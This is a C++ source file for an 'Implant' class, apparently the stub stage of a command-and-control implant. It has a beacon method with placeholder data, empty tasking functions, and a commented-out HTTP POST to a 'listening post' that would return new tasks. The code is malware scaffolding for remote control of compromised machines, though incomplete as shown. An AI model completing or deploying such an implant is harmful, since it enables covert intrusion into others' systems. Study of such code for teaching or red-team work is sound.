#include "implant.hpp"


#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include "includes/include/single_include/nlohmann/json.hpp"

#include <cpr/cpr.h>

using json = nlohmann::json;

Implant::Implant(std::string host, std::string port, std::string uri):
    host(host), port(port), uri(uri)
{
}

void Implant::beacon() {
    boost::property_tree::ptree resultsLocal;
    resultsLocal.add("aaa", "aaaa");
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    sendHttpRequest("a", "a", "a", resultsStringStream.str());
}

void Implant::set_running(bool isRunning)
{
}

void Implant::service_tasks()
{
}

void Implant::parse_response(const std::string &response)
{
}

std::string sendHttpRequest(std::string host,
    std::string port,
    std::string uri,
    std::string payload) {
    // Set all our request constants
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const requestBody = json::parse(payload);

    std::cout << requestBody << std::endl;

    return "";
    /*
    // Construct our listening post endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    // Make an asynchronous HTTP POST request to the listening post
    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
        //cpr::Body{ requestBody.dump() },
        cpr::Header{ {"Content-Type", "application/json"} }
    );
    // Retrieve the response when it's ready
    cpr::Response response = asyncRequest.get();

    // Show the request contents
    std::cout << "Request body: " << requestBody << std::endl;

    // Return the body of the response from the listening post, may include new tasks
    return response.text;*/
}
